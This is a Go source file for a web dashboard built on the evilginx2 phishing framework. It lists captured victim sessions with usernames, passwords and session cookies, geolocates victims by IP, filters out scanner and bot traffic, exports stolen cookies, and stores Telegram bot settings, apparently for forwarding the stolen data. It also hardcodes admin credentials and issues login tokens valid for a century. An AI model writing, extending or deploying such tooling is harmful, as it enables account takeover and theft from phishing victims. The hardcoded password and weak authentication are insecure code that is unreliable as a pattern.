package dashboard

import (
	_ "embed"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/core"
	"github.com/kgretzky/evilginx2/database"
)

//go:embed index.html
var indexHTML string

var botAccessCount int64
var botCountMu sync.Mutex

func IncBotAccess() {
	botCountMu.Lock()
	defer botCountMu.Unlock()
	botAccessCount++
}

func GetBotAccess() int64 {
	botCountMu.Lock()
	defer botCountMu.Unlock()
	return botAccessCount
}

var botPatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)bot|crawl|spider|scrape|curl|wget|python|go-http|java|libwww|httpclient|httrack|scrapy|phantomjs|headless|selenium|puppeteer`),
}

func isBotUA(ua string) bool {
	if ua == "" {
		return true
	}
	for _, re := range botPatterns {
		if re.MatchString(ua) {
			return true
		}
	}
	return false
}

type geoInfo struct {
	Country string `json:"country"`
	Region  string `json:"region"`
	City    string `json:"city"`
}

type geoCacheType struct {
	mu   sync.Mutex
	data map[string]*geoInfo
}

func (g *geoCacheType) get(ip string) *geoInfo {
	g.mu.Lock()
	defer g.mu.Unlock()
	return g.data[ip]
}

func (g *geoCacheType) set(ip string, info *geoInfo) {
	g.mu.Lock()
	defer g.mu.Unlock()
	g.data[ip] = info
}

var geo = &geoCacheType{data: make(map[string]*geoInfo)}

func stripPort(addr string) string {
	i := strings.LastIndex(addr, ":")
	if i > 0 {
		if _, err := strconv.Atoi(addr[i+1:]); err == nil {
			return addr[:i]
		}
	}
	return addr
}

func isPrivateIP(ip string) bool {
	parsed := net.ParseIP(ip)
	if parsed == nil {
		return true
	}
	if parsed.IsLoopback() || parsed.IsPrivate() || parsed.IsUnspecified() {
		return true
	}
	return false
}

func lookupIP(ip string) *geoInfo {
	ip = stripPort(ip)
	if ip == "" || isPrivateIP(ip) {
		return nil
	}

	if cached := geo.get(ip); cached != nil {
		return cached
	}

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get("https://ipinfo.io/" + ip + "/json")
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	var result struct {
		IP     string `json:"ip"`
		City   string `json:"city"`
		Region string `json:"region"`
		Country string `json:"country"`
		Bogon  bool   `json:"bogon"`
	}
	if err := json.Unmarshal(body, &result); err != nil {
		return nil
	}
	if result.Bogon || result.IP == "" {
		return nil
	}

	info := &geoInfo{
		Country: result.Country,
		Region:  result.Region,
		City:    result.City,
	}
	geo.set(ip, info)
	return info
}

var countryNames = map[string]string{
	"US": "United States", "GB": "United Kingdom", "CA": "Canada", "AU": "Australia",
	"DE": "Germany", "FR": "France", "IT": "Italy", "ES": "Spain", "NL": "Netherlands",
	"BR": "Brazil", "IN": "India", "JP": "Japan", "CN": "China", "RU": "Russia",
	"KR": "South Korea", "SG": "Singapore", "ZA": "South Africa", "MX": "Mexico",
	"AR": "Argentina", "SE": "Sweden", "NO": "Norway", "DK": "Denmark", "FI": "Finland",
	"PL": "Poland", "PT": "Portugal", "IE": "Ireland", "CH": "Switzerland", "AT": "Austria",
	"BE": "Belgium", "GR": "Greece", "TR": "Turkey", "IL": "Israel", "AE": "UAE",
	"SA": "Saudi Arabia", "NG": "Nigeria", "EG": "Egypt", "KE": "Kenya", "TH": "Thailand",
	"VN": "Vietnam", "PH": "Philippines", "ID": "Indonesia", "MY": "Malaysia", "NZ": "New Zealand",
	"HK": "Hong Kong", "TW": "Taiwan", "PK": "Pakistan", "BD": "Bangladesh", "UA": "Ukraine",
	"RO": "Romania", "CZ": "Czech Republic", "HU": "Hungary", "CL": "Chile", "CO": "Colombia",
	"PE": "Peru", "IR": "Iran", "IQ": "Iraq", "DZ": "Algeria", "MA": "Morocco",
}

func countryName(cc string) string {
	if name, ok := countryNames[cc]; ok {
		return name
	}
	return cc
}

type Dashboard struct {
	db        *database.Database
	cfg       *core.Config
	authToken string
	port      int
	srv       *http.Server

	loginTokens   map[string]time.Time
	loginTokensMu sync.Mutex
}

const (
	dashUsername = "admin"
	dashPassword = "admin1234567890"
)

func (d *Dashboard) generateLoginToken() string {
	b := make([]byte, 32)
	rand.Read(b)
	token := hex.EncodeToString(b)
	d.loginTokensMu.Lock()
	for k := range d.loginTokens {
		if time.Now().After(d.loginTokens[k]) {
			delete(d.loginTokens, k)
		}
	}
	d.loginTokens[token] = time.Now().Add(100 * 365 * 24 * time.Hour)
	d.loginTokensMu.Unlock()
	return token
}

func (d *Dashboard) isValidLoginToken(token string) bool {
	d.loginTokensMu.Lock()
	defer d.loginTokensMu.Unlock()
	expiry, ok := d.loginTokens[token]
	if !ok {
		return false
	}
	if time.Now().After(expiry) {
		delete(d.loginTokens, token)
		return false
	}
	return true
}

type apiSession struct {
	Id           int                                    `json:"id"`
	Phishlet     string                                 `json:"phishlet"`
	LandingURL   string                                 `json:"landing_url"`
	Username     string                                 `json:"username"`
	Password     string                                 `json:"password"`
	Custom       map[string]string                      `json:"custom"`
	BodyTokens   map[string]string                      `json:"body_tokens"`
	HttpTokens   map[string]string                      `json:"http_tokens"`
	CookieTokens map[string]map[string]*cookieTokenItem `json:"tokens"`
	SessionId    string                                 `json:"session_id"`
	UserAgent    string                                 `json:"useragent"`
	RemoteAddr   string                                 `json:"remote_addr"`
	CreateTime   int64                                  `json:"create_time"`
	UpdateTime   int64                                  `json:"update_time"`
	IsBot        bool                                   `json:"is_bot"`
	Location     string                                 `json:"location"`
}

type cookieTokenItem struct {
	Name     string `json:"name"`
	Value    string `json:"value"`
	Path     string `json:"path"`
	HttpOnly bool   `json:"httpOnly"`
	Secure   bool   `json:"secure"`
}

type statsResponse struct {
	TotalSessions   int `json:"total_sessions"`
	WithCookies     int `json:"with_cookies"`
	WithoutCookies  int `json:"without_cookies"`
	ValidAccess     int `json:"valid_access"`
	BotAccess       int `json:"bot_access"`
}

func New(db *database.Database, cfg *core.Config, authToken string, port int) *Dashboard {
	return &Dashboard{
		db:          db,
		cfg:         cfg,
		authToken:   authToken,
		port:        port,
		loginTokens: make(map[string]time.Time),
	}
}

func (d *Dashboard) Start() error {
	mux := http.NewServeMux()

	mux.HandleFunc("/api/login", d.corsMiddleware(d.handleLogin))
	mux.HandleFunc("/api/check-auth", d.corsMiddleware(d.authMiddleware(d.handleCheckAuth)))
	mux.HandleFunc("/api/sessions", d.corsMiddleware(d.authMiddleware(d.handleSessions)))
	mux.HandleFunc("/api/sessions/", d.corsMiddleware(d.authMiddleware(d.handleSessionByID)))
	mux.HandleFunc("/api/stats", d.corsMiddleware(d.authMiddleware(d.handleStats)))
	mux.HandleFunc("/api/settings", d.corsMiddleware(d.authMiddleware(d.handleSettings)))
	mux.HandleFunc("/api/cookies/", d.corsMiddleware(d.authMiddleware(d.handleCookiesByID)))
	mux.HandleFunc("/", d.corsMiddleware(d.handleFrontend))

	d.srv = &http.Server{
		Handler:      mux,
		Addr:         fmt.Sprintf(":%d", d.port),
		WriteTimeout: 15 * time.Second,
		ReadTimeout:  15 * time.Second,
	}

	return d.srv.ListenAndServe()
}

func (d *Dashboard) Port() int {
	return d.port
}

func (d *Dashboard) AuthToken() string {
	return d.authToken
}

func (d *Dashboard) corsMiddleware(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "GET, DELETE, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")
		if r.Method == "OPTIONS" {
			w.WriteHeader(http.StatusOK)
			return
		}
		next(w, r)
	}
}

func (d *Dashboard) authMiddleware(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		token := r.URL.Query().Get("auth")
		if token == "" {
			token = r.Header.Get("X-Auth-Token")
		}
		authorized := false
		if d.authToken != "" && token == d.authToken {
			authorized = true
		}
		if token != "" && d.isValidLoginToken(token) {
			authorized = true
		}
		if !authorized {
			http.Error(w, `{"error":"unauthorized"}`, http.StatusUnauthorized)
			return
		}
		next(w, r)
	}
}

func (d *Dashboard) handleFrontend(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}
	html := indexHTML
	if d.authToken != "" {
		html = replaceAuthToken(html, d.authToken)
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write([]byte(html))
}

func replaceAuthToken(html, token string) string {
	return strings.ReplaceAll(html, "__AUTH_TOKEN__", token)
}

func (d *Dashboard) handleLogin(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
		return
	}
	var body struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid JSON"})
		return
	}
	if body.Username != dashUsername || body.Password != dashPassword {
		writeJSON(w, http.StatusUnauthorized, map[string]string{"error": "invalid credentials"})
		return
	}
	token := d.generateLoginToken()
	writeJSON(w, http.StatusOK, map[string]string{"token": token})
}

func (d *Dashboard) handleCheckAuth(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, http.StatusOK, map[string]string{"status": "ok"})
}

func (d *Dashboard) handleSessions(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		sessions, err := d.db.ListSessions()
		if err != nil {
			writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
			return
		}

		seen := make(map[string]bool)
		var ips []string
		for _, s := range sessions {
			ip := stripPort(s.RemoteAddr)
			if ip != "" && !seen[ip] {
				seen[ip] = true
				ips = append(ips, ip)
			}
		}

		var wg sync.WaitGroup
		for _, ip := range ips {
			wg.Add(1)
			go func(ip string) {
				defer wg.Done()
				lookupIP(ip)
			}(ip)
		}
		wg.Wait()

		apiSessions := make([]apiSession, 0)
		for _, s := range sessions {
			apiSessions = append(apiSessions, dbSessionToAPI(s))
		}

		writeJSON(w, http.StatusOK, map[string]interface{}{"sessions": apiSessions})
		return
	}
	http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
}

func (d *Dashboard) handleStats(w http.ResponseWriter, r *http.Request) {
	if r.Method != "GET" {
		http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
		return
	}

	sessions, err := d.db.ListSessions()
	if err != nil {
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
		return
	}

	total := len(sessions)
	withCookies := 0
	withoutCookies := 0
	validAccess := 0
	botSessions := 0

	for _, s := range sessions {
		if s.CookieTokens != nil && len(s.CookieTokens) > 0 {
			withCookies++
		} else {
			withoutCookies++
		}
		if isBotUA(s.UserAgent) {
			botSessions++
		}
	}
	validAccess = total - botSessions

	botBlocked := int(GetBotAccess())

	writeJSON(w, http.StatusOK, statsResponse{
		TotalSessions:   total,
		WithCookies:     withCookies,
		WithoutCookies:  withoutCookies,
		ValidAccess:     validAccess,
		BotAccess:       botBlocked + botSessions,
	})
}

func (d *Dashboard) handleSettings(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case "GET":
		writeJSON(w, http.StatusOK, map[string]string{
			"chatid":   d.cfg.GetConfig().Chatid,
			"teletoken": d.cfg.GetConfig().Teletoken,
		})
	case "PUT":
		var body struct {
			Chatid    string `json:"chatid"`
			Teletoken string `json:"teletoken"`
		}
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid JSON"})
			return
		}
		cfg := d.cfg.GetConfig()
		cfg.Chatid = body.Chatid
		cfg.Teletoken = body.Teletoken
		d.cfg.SaveConfig()
		writeJSON(w, http.StatusOK, map[string]string{"status": "saved"})
	default:
		http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
	}
}

func (d *Dashboard) handleSessionByID(w http.ResponseWriter, r *http.Request) {
	idStr := r.URL.Path[len("/api/sessions/"):]
	if idStr == "" {
		http.Error(w, `{"error":"missing session id"}`, http.StatusBadRequest)
		return
	}

	id, err := strconv.Atoi(idStr)
	if err != nil {
		http.Error(w, `{"error":"invalid session id"}`, http.StatusBadRequest)
		return
	}

	sessions, err := d.db.ListSessions()
	if err != nil {
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
		return
	}

	var found *database.Session
	for _, s := range sessions {
		if s.Id == id {
			found = s
			break
		}
	}

	if found == nil {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": "session not found"})
		return
	}

	switch r.Method {
	case "GET":
		writeJSON(w, http.StatusOK, dbSessionToAPI(found))
	case "DELETE":
		err := d.db.DeleteSessionById(id)
		if err != nil {
			writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
			return
		}
		writeJSON(w, http.StatusOK, map[string]string{"status": "deleted"})
	default:
		http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
	}
}

func (d *Dashboard) handleCookiesByID(w http.ResponseWriter, r *http.Request) {
	idStr := r.URL.Path[len("/api/cookies/"):]
	if idStr == "" {
		http.Error(w, `{"error":"missing session id"}`, http.StatusBadRequest)
		return
	}

	id, err := strconv.Atoi(idStr)
	if err != nil {
		http.Error(w, `{"error":"invalid session id"}`, http.StatusBadRequest)
		return
	}

	sessions, err := d.db.ListSessions()
	if err != nil {
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
		return
	}

	var found *database.Session
	for _, s := range sessions {
		if s.Id == id {
			found = s
			break
		}
	}

	if found == nil {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": "session not found"})
		return
	}

	switch r.Method {
	case "GET":
		cookieJSON := core.FormatCookieTokens(found.CookieTokens)
		writeJSON(w, http.StatusOK, map[string]string{"cookies": cookieJSON})
	default:
		http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
	}
}

func dbSessionToAPI(s *database.Session) apiSession {
	ct := make(map[string]map[string]*cookieTokenItem)
	if s.CookieTokens != nil {
		for domain, tmap := range s.CookieTokens {
			ct[domain] = make(map[string]*cookieTokenItem)
			for k, v := range tmap {
				ct[domain][k] = &cookieTokenItem{
					Name:     v.Name,
					Value:    v.Value,
					Path:     v.Path,
					HttpOnly: v.HttpOnly,
					Secure:   v.Secure,
				}
			}
		}
	}

	loc := ""
	if info := lookupIP(s.RemoteAddr); info != nil {
		parts := []string{}
		if info.City != "" {
			parts = append(parts, info.City)
		}
		if info.Region != "" && info.Region != info.City {
			parts = append(parts, info.Region)
		}
		if info.Country != "" {
			parts = append(parts, countryName(info.Country))
		}
		if len(parts) > 0 {
			loc = strings.Join(parts, ", ")
		}
	}

	return apiSession{
		Id:           s.Id,
		Phishlet:     s.Phishlet,
		LandingURL:   s.LandingURL,
		Username:     s.Username,
		Password:     s.Password,
		Custom:       s.Custom,
		BodyTokens:   s.BodyTokens,
		HttpTokens:   s.HttpTokens,
		CookieTokens: ct,
		SessionId:    s.SessionId,
		UserAgent:    s.UserAgent,
		RemoteAddr:   s.RemoteAddr,
		CreateTime:   s.CreateTime,
		UpdateTime:   s.UpdateTime,
		IsBot:        isBotUA(s.UserAgent),
		Location:     loc,
	}
}

func writeJSON(w http.ResponseWriter, status int, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(v)
}